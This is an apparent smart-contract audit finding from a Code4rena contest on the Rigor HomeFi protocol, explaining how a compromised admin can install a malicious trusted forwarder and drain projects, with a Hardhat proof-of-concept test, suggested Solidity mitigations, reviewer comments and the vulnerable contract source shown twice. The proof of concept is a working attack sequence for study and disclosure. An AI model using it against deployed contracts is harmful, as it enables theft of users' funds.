{
  "Title": "[M-06] Attacker can drain all the projects within minutes, if admin account has been exposed",
  "Content": "_Submitted by 0xA5DF, also found by Lambda and sseefried_\n\n[HomeFi.sol#L156-L169](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L156-L169)<br>\n[HomeFi.sol#L199-L208](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L199-L208)<br>\n\nIn case where the admin wallet has been hacked, the attacker can drain all funds out of the project within minutes. All the attacker needs is the admin to sign a single meta/normal tx.<br>\nEven though the likelihood of the admin wallet being hacked might be low, given that the impact is critical - I think this makes it at least a medium bug.\n\nExamples of cases where the attacker can gain access to admin wallet:\n\n*   The computer which the admins are using has been hacked\n    *   Even if a hardware wallet is used, the attacker can still replace the data sent to the wallet the next time the admin has to sign a tx (whether it's a meta or normal tx)\n*   The website/software where the meta tx data is generated has been hacked and attacker modifies the data for tx\n*   A malicious website tricks the admin into signing a meta tx to replace the admin or forwarder\n\nSince the forwarder has the power to do everything in the system , once an attacker manages to replace it with a malicious forwarder, he can do whatever he wants withing minutes:\n\n*   The forwarder can replace the admin\n*   The forwarder can drain all funds from all projects by changing the subcontractor and marking tasks as complete, or adding new tasks / changing task cost as needed.\n\nEven when signatures are required, you can bypass it by using the `approveHash` function.\n\n### Proof of Concept\n\nHere's a PoC for taking over and running the `Project.setComplete()` function (I haven't included a whole process of changing SC etc. since that would be too time consuming, but there shouldn't be a difference between functions, all can be impersonated once you control the forwarder).\n\nThe PoC was added to [projectTests.ts#L1109](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1109), and is based on the 'should be able to complete a task' test.\n\n```typescript\n\n\n  it('PoC forwarder overtake', async () => {\n    const attacker = signers[10];\n\n\n    // deploy the malicious forwarder\n    const maliciousForwarder = await deploy<MaliciousForwarder>('MaliciousForwarder');\n    const adminAddress = await homeFiContract.admin();\n    const adminSigner = getSignerByAddress(signers, adminAddress);\n    // attacker takes over\n    await homeFiContract.connect(adminSigner).setTrustedForwarder(maliciousForwarder.address);\n      \n    // attacker can now replace the admin, so that admin can't set the forwarder back\n    let { data } = await homeFiContract.populateTransaction.replaceAdmin(\n      attacker.address\n    );\n    let from = adminAddress;\n    let to = homeFiContract.address;\n    if (!data) {\n      throw Error('No data');\n    }\n    let tx = await executeMetaTX(from, to, data);\n\n    // assert that admin has been replaced by attacker\n    expect(await homeFiContract.admin()).to.be.eq(attacker.address);\n\n    // attacker can now execute setComplete() using the approveHash() method\n\n    const taskID = 1;\n    const _taskCost = 2 * taskCost;\n    const taskSC = signers[3];\n    let completeData = {\n      types: ['uint256', 'address'],\n      values: [taskID, project.address],\n    };\n    const [encodedData, hash] = await encodeDataAndHash(completeData);\n    await mockDAIContract.mock.transfer\n      .withArgs(taskSC.address, _taskCost)\n      .returns(true);\n    await mockDAIContract.mock.transfer\n      .withArgs(await homeFiContract.treasury(), _taskCost / 1e3)\n      .returns(true);\n\n    ({data} = await project.populateTransaction.approveHash(hash));\n    let contractor = await project.contractor();\n    let {subcontractor} = await project.getTask(taskID);\n    let builder = await project.builder();\n\n    await executeMetaTX(contractor, project.address, data as string);\n    await executeMetaTX(subcontractor, project.address, data as string);\n    await executeMetaTX(builder, project.address, data as string);\n    \n\n    tx = await project.setComplete(encodedData, \"0x\");\n    await tx.wait();\n\n    await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);\n\n    const { state } = await project.getTask(taskID);\n    expect(state).to.equal(3);\n    const getAlerts = await project.getAlerts(taskID);\n    expect(getAlerts[0]).to.equal(true);\n    expect(getAlerts[1]).to.equal(true);\n    expect(getAlerts[2]).to.equal(true);\n    expect(await project.lastAllocatedChangeOrderTask()).to.equal(0);\n    expect(await project.changeOrderedTask()).to.deep.equal([]);\n\n    async function executeMetaTX(from: string, to: string, data: string ) {\n      const gasLimit = await ethers.provider.estimateGas({\n        to,\n        from,\n        data,\n      });\n      const message = {\n        from,\n        to,\n        value: 0,\n        gas: gasLimit.toNumber(),\n        nonce: 0,\n        data,\n      };\n\n      // @ts-ignore\n      let tx = await maliciousForwarder.execute(message, \"0x\");\n      return tx;\n    }\n  });\n\n\n// ----------------------------------------------------- //\n// Added to ethersHelpers.ts file:\nexport function encodeDataAndHash(\n  data: any): string[] {\n  const encodedData = encodeData(data);\n  const encodedMsgHash = ethers.utils.keccak256(encodedData);\n  return [encodedData, encodedMsgHash];\n}\n```\n\n### Recommended Mitigation Steps\n\n*   Limit `approveHash` to contracts only - I understood from the sponsor that it is used for contracts to sign hashes. So limiting it to contracts only can help prevent stealing funds (from projects that are held by EOA) in case that the forwarder has been compromised (this is effective also in case there's some bug in the forwarder contract).\n    *   Alternately, you can also make it use `msg.sender` instead of `_msgSender()`, this will also have a similar effect (it will allow also EOA to use the function, but not via forwarder).\n        *   The advantage is that not only it wouldn't cost more than now, it'll even save gas.\n        *   Another advantage is that it will also protect projects held by contracts from being impersonated by a malicious forwarder\n\n*   Make the process of replacing the forwarder or the admin a 2 step process with a delay between the steps (except for disabling the forwarder, in case the forwarder was hacked). This will give the admin the option to take steps to stop the attack, or at least give the users time to withdraw their money.\n\n```solidity\n    /// @inheritdoc IHomeFi\n    function replaceAdmin(address _newAdmin)\n        external\n        override\n        onlyAdmin\n        nonZero(_newAdmin)\n        noChange(admin, _newAdmin)\n    {\n        // Replace admin\n        pendingAdmin = _newAdmin;\n\n        adminReplacementTime = block.timestamp + 1 days;\n        emit AdminReplaceProposed(_newAdmin);\n    }\n\n        /// @inheritdoc IHomeFi\n    function executeReplaceAdmin()\n        external\n        override\n        onlyAdmin\n\n    {\n        require(adminReplacementTime > 0 && block.timestamp > adminReplacementTime, \"HomeFi::adminReplacmantTime\");\n        // Replace admin\n        admin = pendingAdmin;\n\n        emit AdminReplaced(_newAdmin);\n    }\n    /// @inheritdoc IHomeFi\n    function setTrustedForwarder(address _newForwarder)\n        external\n        override\n        onlyAdmin\n        noChange(trustedForwarder, _newForwarder)\n    {\n        // allow disabling the forwarder immediately in case it has been hacked\n        if(_newForwarder == address(0)){\n            trustedForwarder = _newForwarder;\n        }\n        forwarderSetTime = block.timestamp + 3 days;\n        pendingTrustedForwarder = _newForwarder;\n    }\n\n    function executeSetTrustedForwarder(address _newForwarder)\n        external\n        override\n        onlyAdmin\n    {\n        require(forwarderSetTime > 0 &&  block.timestamp > forwarderSetTime, \"HomeFi::forwarderSetTime\");\n        trustedForwarder = pendingTrustedForwarder;\n    }\n\n```\n\n*   Consider removing the meta tx for `HomeFi` `onlyAdmin` modifier (i.e. usg `msg.sender` instead of `_msgSender()`), given that it's not going to be used that often it may be worth giving up the comfort for hardening security\n\n**[parv3213 (Rigor) confirmed](https://github.com/code-423n4/2022-08-rigor-findings/issues/264)**\n\n**[0xA5DF (warden) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/264#issuecomment-1211394594):**\n > Dupe of @sseefried's [#165](https://github.com/code-423n4/2022-08-rigor-findings/issues/165) \n> \n> Edit: On a second look issue 165 focuses more on not giving the forwarder the ability to impersonate the admin, and less on the damage that can be done with the forwarder using normal functionality (i.e. impersonating regular users, being able to drain all funds from projects).<br>\n> Also the suggested mitigation is very different.<br>\n> I think this makes this a different issue, but leaving this to the judge to decide.\n\n**[Jack the Pug (judge) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/264#issuecomment-1229188594):**\n > Both this and 165 are good findings, I tend to merge 165 into this. The usage of EIP2771 is not very common, and I think you raised a noteworthy point that: a relayer's `_msgSender` is less trustworthy than the real `msg.sender`, the admin themself should not be trusted too much either.\n> \n> I also like your writing, short but comprehensive. Thanks for being part of the C4 community, @0xA5DF! \n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2022-08-rigor-protocol-contest",
  "Code": [
    {
      "filename": "contracts/HomeFi.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.6;\n\nimport {IHomeFi} from \"./interfaces/IHomeFi.sol\";\nimport {IProjectFactory} from \"./interfaces/IProjectFactory.sol\";\nimport {ReentrancyGuardUpgradeable} from \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport {ERC721URIStorageUpgradeable} from \"@openzeppelin/contracts-upgradeable/token/ERC721/extensions/ERC721URIStorageUpgradeable.sol\";\nimport {ContextUpgradeable, ERC2771ContextUpgradeable} from \"@openzeppelin/contracts-upgradeable/metatx/ERC2771ContextUpgradeable.sol\";\n\n/**\n * @title HomeFi v2.5.0 HomeFi Contract.\n\n * @notice Main on-chain client.\n * Administrative controls and project deployment.\n \n * @dev\n * Adheres to -\n * IHomeFi: Allows this contract to be used by other HomeFi contracts.\n\n * @dev\n * Inherits from -\n * ReentrancyGuardUpgradeable: Contract module that helps prevent reentrant calls to a function.\n * ERC721URIStorageUpgradeable: ERC721 token with storage based token URI management.\n * ERC2771ContextUpgradeable: Context variant with ERC2771 support.\n */\ncontract HomeFi is\n    IHomeFi,\n    ReentrancyGuardUpgradeable,\n    ERC721URIStorageUpgradeable,\n    ERC2771ContextUpgradeable\n{\n    /*******************************************************************************\n     * -------------------------PUBLIC STORED PROPERTIES-------------------------- *\n     *******************************************************************************/\n\n    /// @inheritdoc IHomeFi\n    address public override tokenCurrency1;\n    /// @inheritdoc IHomeFi\n    address public override tokenCurrency2;\n    /// @inheritdoc IHomeFi\n    address public override tokenCurrency3;\n    /// @inheritdoc IHomeFi\n    IProjectFactory public override projectFactoryInstance;\n    /// @inheritdoc IHomeFi\n    address public override disputesContract;\n    /// @inheritdoc IHomeFi\n    address public override communityContract;\n    /// @inheritdoc IHomeFi\n    bool public override addrSet;\n    /// @inheritdoc IHomeFi\n    address public override admin;\n    /// @inheritdoc IHomeFi\n    address public override treasury;\n    /// @inheritdoc IHomeFi\n    uint256 public override lenderFee;\n    /// @inheritdoc IHomeFi\n    uint256 public override projectCount;\n    /// @inheritdoc IHomeFi\n    address public override trustedForwarder;\n    /// @inheritdoc IHomeFi\n    mapping(uint256 => address) public override projects;\n    /// @inheritdoc IHomeFi\n    mapping(address => uint256) public override projectTokenId;\n    /// @inheritdoc IHomeFi\n    mapping(address => address) public override wrappedToken;\n\n    /*******************************************************************************\n     * ---------------------------------MODIFIERS--------------------------------- *\n     *******************************************************************************/\n\n    modifier onlyAdmin() {\n        require(admin == _msgSender(), \"HomeFi::!Admin\");\n        _;\n    }\n\n    modifier nonZero(address _address) {\n        require(_address != address(0), \"HomeFi::0 address\");\n        _;\n    }\n\n    modifier noChange(address _oldAddress, address _newAddress) {\n        // Revert if new address is same as old\n        require(_oldAddress != _newAddress, \"HomeFi::!Change\");\n        _;\n    }\n\n    /*******************************************************************************\n     * ---------------------------EXTERNAL TRANSACTIONS--------------------------- *\n     *******************************************************************************/\n    /// @inheritdoc IHomeFi\n    function initialize(\n        address _treasury,\n        uint256 _lenderFee,\n        address _tokenCurrency1,\n        address _tokenCurrency2,\n        address _tokenCurrency3,\n        address _forwarder\n    )\n        external\n        override\n        initializer\n        nonZero(_treasury)\n        nonZero(_tokenCurrency1)\n        nonZero(_tokenCurrency2)\n        nonZero(_tokenCurrency3)\n    {\n        // Initialize ERC721 and ERC2771Context\n        __ERC721_init(\"HomeFiNFT\", \"hNFT\");\n        __ERC2771Context_init(_forwarder);\n\n        // Initialize variables\n        admin = _msgSender();\n        treasury = _treasury;\n        lenderFee = _lenderFee; // the percentage must be multiplied with 10\n        tokenCurrency1 = _tokenCurrency1;\n        tokenCurrency2 = _tokenCurrency2;\n        tokenCurrency3 = _tokenCurrency3;\n        trustedForwarder = _forwarder;\n    }\n\n    /// @inheritdoc IHomeFi\n    function setAddr(\n        address _projectFactory,\n        address _communityContract,\n        address _disputesContract,\n        address _hTokenCurrency1,\n        address _hTokenCurrency2,\n        address _hTokenCurrency3\n    )\n        external\n        override\n        onlyAdmin\n        nonZero(_projectFactory)\n        nonZero(_communityContract)\n        nonZero(_disputesContract)\n        nonZero(_hTokenCurrency1)\n        nonZero(_hTokenCurrency2)\n        nonZero(_hTokenCurrency3)\n    {\n        // Revert if addrSet is true\n        require(!addrSet, \"HomeFi::Set\");\n\n        // Initialize variables\n        projectFactoryInstance = IProjectFactory(_projectFactory);\n        communityContract = _communityContract;\n        disputesContract = _disputesContract;\n        wrappedToken[tokenCurrency1] = _hTokenCurrency1;\n        wrappedToken[tokenCurrency2] = _hTokenCurrency2;\n        wrappedToken[tokenCurrency3] = _hTokenCurrency3;\n        addrSet = true;\n\n        emit AddressSet();\n    }\n\n    /// @inheritdoc IHomeFi\n    function replaceAdmin(address _newAdmin)\n        external\n        override\n        onlyAdmin\n        nonZero(_newAdmin)\n        noChange(admin, _newAdmin)\n    {\n        // Replace admin\n        admin = _newAdmin;\n\n        emit AdminReplaced(_newAdmin);\n    }\n\n    /// @inheritdoc IHomeFi\n    function replaceTreasury(address _newTreasury)\n        external\n        override\n        onlyAdmin\n        nonZero(_newTreasury)\n        noChange(treasury, _newTreasury)\n    {\n        // Replace treasury\n        treasury = _newTreasury;\n\n        emit TreasuryReplaced(_newTreasury);\n    }\n\n    /// @inheritdoc IHomeFi\n    function replaceLenderFee(uint256 _newLenderFee)\n        external\n        override\n        onlyAdmin\n    {\n        // Revert if no change in lender fee\n        require(lenderFee != _newLenderFee, \"HomeFi::!Change\");\n\n        // Reset variables\n        lenderFee = _newLenderFee;\n\n        emit LenderFeeReplaced(_newLenderFee);\n    }\n\n    /// @inheritdoc IHomeFi\n    function setTrustedForwarder(address _newForwarder)\n        external\n        override\n        onlyAdmin\n        noChange(trustedForwarder, _newForwarder)\n    {\n        trustedForwarder = _newForwarder;\n    }\n\n    /// @inheritdoc IHomeFi\n    function createProject(bytes memory _hash, address _currency)\n        external\n        override\n        nonReentrant\n    {\n        // Revert if currency not supported by HomeFi\n        validCurrency(_currency);\n\n        address _sender = _msgSender();\n\n        // Create a new project Clone and mint a new NFT for it\n        address _project = projectFactoryInstance.createProject(\n            _currency,\n            _sender\n        );\n        mintNFT(_sender, string(_hash));\n\n        // Update project related mappings\n        projects[projectCount] = _project;\n        projectTokenId[_project] = projectCount;\n\n        emit ProjectAdded(projectCount, _project, _sender, _currency, _hash);\n    }\n\n    /*******************************************************************************\n     * ------------------------------EXTERNAL VIEWS------------------------------- *\n     *******************************************************************************/\n\n    /// @inheritdoc IHomeFi\n    function isProjectExist(address _project)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return projectTokenId[_project] > 0;\n    }\n\n    /*******************************************************************************\n     * -------------------------------PUBLIC VIEWS-------------------------------- *\n     *******************************************************************************/\n\n    /// @inheritdoc IHomeFi\n    function validCurrency(address _currency) public view override {\n        // _currency must be one of HomeFi supported currencies\n        require(\n            _currency == tokenCurrency1 ||\n                _currency == tokenCurrency2 ||\n                _currency == tokenCurrency3,\n            \"HomeFi::!Currency\"\n        );\n    }\n\n    /// @inheritdoc IHomeFi\n    function isTrustedForwarder(address _forwarder)\n        public\n        view\n        override(ERC2771ContextUpgradeable, IHomeFi)\n        returns (bool)\n    {\n        return trustedForwarder == _forwarder;\n    }\n\n    /*******************************************************************************\n     * ---------------------------INTERNAL TRANSACTIONS--------------------------- *\n     *******************************************************************************/\n    /**\n     * @dev Makes an NFT for every project\n\n     * @param _to address - NFT owner. Initially it will be the project builder.\n     * @param _tokenURI string - IPFS hash of project details like name, description etc\n\n     * @return _tokenIds NFT Id of project\n     */\n    function mintNFT(address _to, string memory _tokenURI)\n        internal\n        returns (uint256)\n    {\n        // Project count starts from 1\n        projectCount += 1;\n\n        // Mints NFT and set token URI\n        _mint(_to, projectCount);\n        _setTokenURI(projectCount, _tokenURI);\n\n        emit NftCreated(projectCount, _to);\n        return projectCount;\n    }\n\n    /*******************************************************************************\n     * ------------------------------INTERNAL VIEWS------------------------------- *\n     *******************************************************************************/\n    /// @dev This is same as ERC2771ContextUpgradeable._msgSender()\n    function _msgSender()\n        internal\n        view\n        override(ContextUpgradeable, ERC2771ContextUpgradeable)\n        returns (address sender)\n    {\n        // We want to use the _msgSender() implementation of ERC2771ContextUpgradeable\n        return super._msgSender();\n    }\n\n    /// @dev This is same as ERC2771ContextUpgradeable._msgData()\n    function _msgData()\n        internal\n        view\n        override(ContextUpgradeable, ERC2771ContextUpgradeable)\n        returns (bytes calldata)\n    {\n        // We want to use the _msgData() implementation of ERC2771ContextUpgradeable\n        return super._msgData();\n    }\n}"
    },
    {
      "filename": "contracts/HomeFi.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.6;\n\nimport {IHomeFi} from \"./interfaces/IHomeFi.sol\";\nimport {IProjectFactory} from \"./interfaces/IProjectFactory.sol\";\nimport {ReentrancyGuardUpgradeable} from \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport {ERC721URIStorageUpgradeable} from \"@openzeppelin/contracts-upgradeable/token/ERC721/extensions/ERC721URIStorageUpgradeable.sol\";\nimport {ContextUpgradeable, ERC2771ContextUpgradeable} from \"@openzeppelin/contracts-upgradeable/metatx/ERC2771ContextUpgradeable.sol\";\n\n/**\n * @title HomeFi v2.5.0 HomeFi Contract.\n\n * @notice Main on-chain client.\n * Administrative controls and project deployment.\n \n * @dev\n * Adheres to -\n * IHomeFi: Allows this contract to be used by other HomeFi contracts.\n\n * @dev\n * Inherits from -\n * ReentrancyGuardUpgradeable: Contract module that helps prevent reentrant calls to a function.\n * ERC721URIStorageUpgradeable: ERC721 token with storage based token URI management.\n * ERC2771ContextUpgradeable: Context variant with ERC2771 support.\n */\ncontract HomeFi is\n    IHomeFi,\n    ReentrancyGuardUpgradeable,\n    ERC721URIStorageUpgradeable,\n    ERC2771ContextUpgradeable\n{\n    /*******************************************************************************\n     * -------------------------PUBLIC STORED PROPERTIES-------------------------- *\n     *******************************************************************************/\n\n    /// @inheritdoc IHomeFi\n    address public override tokenCurrency1;\n    /// @inheritdoc IHomeFi\n    address public override tokenCurrency2;\n    /// @inheritdoc IHomeFi\n    address public override tokenCurrency3;\n    /// @inheritdoc IHomeFi\n    IProjectFactory public override projectFactoryInstance;\n    /// @inheritdoc IHomeFi\n    address public override disputesContract;\n    /// @inheritdoc IHomeFi\n    address public override communityContract;\n    /// @inheritdoc IHomeFi\n    bool public override addrSet;\n    /// @inheritdoc IHomeFi\n    address public override admin;\n    /// @inheritdoc IHomeFi\n    address public override treasury;\n    /// @inheritdoc IHomeFi\n    uint256 public override lenderFee;\n    /// @inheritdoc IHomeFi\n    uint256 public override projectCount;\n    /// @inheritdoc IHomeFi\n    address public override trustedForwarder;\n    /// @inheritdoc IHomeFi\n    mapping(uint256 => address) public override projects;\n    /// @inheritdoc IHomeFi\n    mapping(address => uint256) public override projectTokenId;\n    /// @inheritdoc IHomeFi\n    mapping(address => address) public override wrappedToken;\n\n    /*******************************************************************************\n     * ---------------------------------MODIFIERS--------------------------------- *\n     *******************************************************************************/\n\n    modifier onlyAdmin() {\n        require(admin == _msgSender(), \"HomeFi::!Admin\");\n        _;\n    }\n\n    modifier nonZero(address _address) {\n        require(_address != address(0), \"HomeFi::0 address\");\n        _;\n    }\n\n    modifier noChange(address _oldAddress, address _newAddress) {\n        // Revert if new address is same as old\n        require(_oldAddress != _newAddress, \"HomeFi::!Change\");\n        _;\n    }\n\n    /*******************************************************************************\n     * ---------------------------EXTERNAL TRANSACTIONS--------------------------- *\n     *******************************************************************************/\n    /// @inheritdoc IHomeFi\n    function initialize(\n        address _treasury,\n        uint256 _lenderFee,\n        address _tokenCurrency1,\n        address _tokenCurrency2,\n        address _tokenCurrency3,\n        address _forwarder\n    )\n        external\n        override\n        initializer\n        nonZero(_treasury)\n        nonZero(_tokenCurrency1)\n        nonZero(_tokenCurrency2)\n        nonZero(_tokenCurrency3)\n    {\n        // Initialize ERC721 and ERC2771Context\n        __ERC721_init(\"HomeFiNFT\", \"hNFT\");\n        __ERC2771Context_init(_forwarder);\n\n        // Initialize variables\n        admin = _msgSender();\n        treasury = _treasury;\n        lenderFee = _lenderFee; // the percentage must be multiplied with 10\n        tokenCurrency1 = _tokenCurrency1;\n        tokenCurrency2 = _tokenCurrency2;\n        tokenCurrency3 = _tokenCurrency3;\n        trustedForwarder = _forwarder;\n    }\n\n    /// @inheritdoc IHomeFi\n    function setAddr(\n        address _projectFactory,\n        address _communityContract,\n        address _disputesContract,\n        address _hTokenCurrency1,\n        address _hTokenCurrency2,\n        address _hTokenCurrency3\n    )\n        external\n        override\n        onlyAdmin\n        nonZero(_projectFactory)\n        nonZero(_communityContract)\n        nonZero(_disputesContract)\n        nonZero(_hTokenCurrency1)\n        nonZero(_hTokenCurrency2)\n        nonZero(_hTokenCurrency3)\n    {\n        // Revert if addrSet is true\n        require(!addrSet, \"HomeFi::Set\");\n\n        // Initialize variables\n        projectFactoryInstance = IProjectFactory(_projectFactory);\n        communityContract = _communityContract;\n        disputesContract = _disputesContract;\n        wrappedToken[tokenCurrency1] = _hTokenCurrency1;\n        wrappedToken[tokenCurrency2] = _hTokenCurrency2;\n        wrappedToken[tokenCurrency3] = _hTokenCurrency3;\n        addrSet = true;\n\n        emit AddressSet();\n    }\n\n    /// @inheritdoc IHomeFi\n    function replaceAdmin(address _newAdmin)\n        external\n        override\n        onlyAdmin\n        nonZero(_newAdmin)\n        noChange(admin, _newAdmin)\n    {\n        // Replace admin\n        admin = _newAdmin;\n\n        emit AdminReplaced(_newAdmin);\n    }\n\n    /// @inheritdoc IHomeFi\n    function replaceTreasury(address _newTreasury)\n        external\n        override\n        onlyAdmin\n        nonZero(_newTreasury)\n        noChange(treasury, _newTreasury)\n    {\n        // Replace treasury\n        treasury = _newTreasury;\n\n        emit TreasuryReplaced(_newTreasury);\n    }\n\n    /// @inheritdoc IHomeFi\n    function replaceLenderFee(uint256 _newLenderFee)\n        external\n        override\n        onlyAdmin\n    {\n        // Revert if no change in lender fee\n        require(lenderFee != _newLenderFee, \"HomeFi::!Change\");\n\n        // Reset variables\n        lenderFee = _newLenderFee;\n\n        emit LenderFeeReplaced(_newLenderFee);\n    }\n\n    /// @inheritdoc IHomeFi\n    function setTrustedForwarder(address _newForwarder)\n        external\n        override\n        onlyAdmin\n        noChange(trustedForwarder, _newForwarder)\n    {\n        trustedForwarder = _newForwarder;\n    }\n\n    /// @inheritdoc IHomeFi\n    function createProject(bytes memory _hash, address _currency)\n        external\n        override\n        nonReentrant\n    {\n        // Revert if currency not supported by HomeFi\n        validCurrency(_currency);\n\n        address _sender = _msgSender();\n\n        // Create a new project Clone and mint a new NFT for it\n        address _project = projectFactoryInstance.createProject(\n            _currency,\n            _sender\n        );\n        mintNFT(_sender, string(_hash));\n\n        // Update project related mappings\n        projects[projectCount] = _project;\n        projectTokenId[_project] = projectCount;\n\n        emit ProjectAdded(projectCount, _project, _sender, _currency, _hash);\n    }\n\n    /*******************************************************************************\n     * ------------------------------EXTERNAL VIEWS------------------------------- *\n     *******************************************************************************/\n\n    /// @inheritdoc IHomeFi\n    function isProjectExist(address _project)\n        external\n        view\n        override\n        returns (bool)\n    {\n        return projectTokenId[_project] > 0;\n    }\n\n    /*******************************************************************************\n     * -------------------------------PUBLIC VIEWS-------------------------------- *\n     *******************************************************************************/\n\n    /// @inheritdoc IHomeFi\n    function validCurrency(address _currency) public view override {\n        // _currency must be one of HomeFi supported currencies\n        require(\n            _currency == tokenCurrency1 ||\n                _currency == tokenCurrency2 ||\n                _currency == tokenCurrency3,\n            \"HomeFi::!Currency\"\n        );\n    }\n\n    /// @inheritdoc IHomeFi\n    function isTrustedForwarder(address _forwarder)\n        public\n        view\n        override(ERC2771ContextUpgradeable, IHomeFi)\n        returns (bool)\n    {\n        return trustedForwarder == _forwarder;\n    }\n\n    /*******************************************************************************\n     * ---------------------------INTERNAL TRANSACTIONS--------------------------- *\n     *******************************************************************************/\n    /**\n     * @dev Makes an NFT for every project\n\n     * @param _to address - NFT owner. Initially it will be the project builder.\n     * @param _tokenURI string - IPFS hash of project details like name, description etc\n\n     * @return _tokenIds NFT Id of project\n     */\n    function mintNFT(address _to, string memory _tokenURI)\n        internal\n        returns (uint256)\n    {\n        // Project count starts from 1\n        projectCount += 1;\n\n        // Mints NFT and set token URI\n        _mint(_to, projectCount);\n        _setTokenURI(projectCount, _tokenURI);\n\n        emit NftCreated(projectCount, _to);\n        return projectCount;\n    }\n\n    /*******************************************************************************\n     * ------------------------------INTERNAL VIEWS------------------------------- *\n     *******************************************************************************/\n    /// @dev This is same as ERC2771ContextUpgradeable._msgSender()\n    function _msgSender()\n        internal\n        view\n        override(ContextUpgradeable, ERC2771ContextUpgradeable)\n        returns (address sender)\n    {\n        // We want to use the _msgSender() implementation of ERC2771ContextUpgradeable\n        return super._msgSender();\n    }\n\n    /// @dev This is same as ERC2771ContextUpgradeable._msgData()\n    function _msgData()\n        internal\n        view\n        override(ContextUpgradeable, ERC2771ContextUpgradeable)\n        returns (bytes calldata)\n    {\n        // We want to use the _msgData() implementation of ERC2771ContextUpgradeable\n        return super._msgData();\n    }\n}"
    },
    {
      "filename": "test/utils/projectTests.ts",
      "content": "import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';\nimport { expect } from 'chai';\nimport { ethers } from 'hardhat';\nimport { HomeFi } from '../../artifacts/types/HomeFi';\nimport { Project } from '../../artifacts/types/Project';\nimport { createProjectWithoutContractor, multisig } from '.';\nimport { MockContract } from 'ethereum-waffle';\nimport { createTasks } from './projectHelpers';\nimport { encodeData } from './ethersHelpers';\n\nexport const projectTests = async ({\n  treasury,\n  lenderFee,\n  homeFiContract,\n  tokenCurrency1,\n  signers,\n  project,\n  mockDAIContract,\n  mockETHContract,\n  etherProject,\n  project2,\n  mockUSDCContract,\n  tasksLibrary,\n}: {\n  treasury: string;\n  lenderFee: number;\n  homeFiContract: HomeFi;\n  tokenCurrency1: any;\n  signers: SignerWithAddress[];\n  project: Project;\n  mockDAIContract: MockContract;\n  mockETHContract: MockContract;\n  etherProject: Project;\n  project2: Project;\n  mockUSDCContract: MockContract;\n  tasksLibrary: any;\n}) => {\n  const projectV2Version = 25000;\n  const taskCost = 1e11;\n  let taskList: number[] = [];\n  let ethersTaskList: number[] = [];\n  it('should be initialised properly', async () => {\n    expect(await project.homeFi()).to.equal(homeFiContract.address);\n    expect(await project.currency()).to.equal(tokenCurrency1);\n    expect(await project.lenderFee()).to.equal(lenderFee);\n    expect(await project.builder()).to.equal(signers[0].address);\n    expect(await project.contractor()).to.equal(ethers.constants.AddressZero);\n    expect(await project.contractorConfirmed()).to.equal(false);\n    expect(await project.hashChangeNonce()).to.equal(0);\n    expect(await project.totalLent()).to.equal(0);\n    expect(await project.totalAllocated()).to.equal(0);\n    expect(await project.taskCount()).to.equal(0);\n    const { cost, subcontractor, state } = await project.getTask(0);\n    expect(cost).to.equal(0);\n    expect(subcontractor).to.equal(ethers.constants.AddressZero);\n    expect(state).to.equal(0);\n    expect(await project.VERSION()).to.equal(projectV2Version);\n    expect(await project.contractorDelegated()).to.equal(false);\n    expect(await project.lastAllocatedTask()).to.equal(0);\n    expect(await project.changeOrderedTask()).to.deep.equal([]);\n    expect(await project.lastAllocatedChangeOrderTask()).to.equal(0);\n    expect(await project.getAlerts(0)).to.have.members([false, false, false]);\n    expect(await project.projectCost()).to.equal(0);\n    const count = (await homeFiContract.projectCount()).toNumber();\n    const projectId = await homeFiContract.projectTokenId(project.address);\n    const balance = await homeFiContract.balanceOf(signers[0].address);\n    const balance2 = await homeFiContract.balanceOf(signers[4].address); // [from upgradability test] additional project from signer[4] was required in community tests\n    const owner = await homeFiContract.ownerOf(projectId);\n    expect(balance.add(balance2)).to.equal(count);\n    expect(owner).to.equal(signers[0].address);\n    expect(await homeFiContract.projects(projectId)).to.equal(project.address);\n  });\n\n  // --- updateProjectHash() ---\n  it('should revert to update project hash with wrong hash', async () => {\n    const newHash = '0x';\n    const data = {\n      types: ['bytes', 'uint256'],\n      values: [newHash, (await project.hashChangeNonce()).toNumber() + 1],\n    };\n    const [encodedData, signature] = await multisig(data, [signers[0]]);\n    const tx = project.updateProjectHash(encodedData, signature);\n    await expect(tx).to.be.revertedWith('Project::!Nonce');\n  });\n\n  it('should revert update project hash with wrong signature (without Builder signature)', async () => {\n    const newHash = '0x';\n    const data = {\n      types: ['bytes', 'uint256'],\n      values: [newHash, await project.hashChangeNonce()],\n    };\n    const [encodedData, signature] = await multisig(data, [signers[1]]);\n    const tx = project.updateProjectHash(encodedData, signature);\n    await expect(tx).to.be.revertedWith('Project::invalid signature');\n  });\n\n  it('should be able update project hash by builder', async () => {\n    const oldHashChangeNonce = await project.hashChangeNonce();\n    const newHash = '0x';\n    const data = {\n      types: ['bytes', 'uint256'],\n      values: [newHash, oldHashChangeNonce],\n    };\n    const [encodedData, signature] = await multisig(data, [signers[0]]);\n    const tx = await project.updateProjectHash(encodedData, signature);\n    await expect(tx).to.emit(project, 'HashUpdated').withArgs(newHash);\n    expect(await project.hashChangeNonce()).to.equal(oldHashChangeNonce.add(1));\n  });\n\n  it('should be able to do onchain signature using approve hash', async () => {\n    const oldHashChangeNonce = await project.hashChangeNonce();\n    const newHash = '0x12';\n    const data = {\n      types: ['bytes', 'uint256'],\n      values: [newHash, oldHashChangeNonce],\n    };\n    const encodedData = encodeData(data);\n    const encodedMsgHash = ethers.utils.keccak256(encodedData);\n    const tx = await project.approveHash(encodedMsgHash);\n\n    await expect(tx)\n      .to.emit(project, 'ApproveHash')\n      .withArgs(encodedMsgHash, signers[0].address);\n\n    await project.updateProjectHash(encodedData, '0x');\n    expect(await 